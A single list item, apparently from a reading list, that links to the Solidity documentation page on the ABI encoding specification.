-   Documentation on the ABI encoding spec of Solidity. <a target="_blank" rel="noopener noreferrer" href="https://docs.soliditylang.org/en/develop/abi-spec.html">https://docs.soliditylang.org/en/develop/abi-spec.html</a>
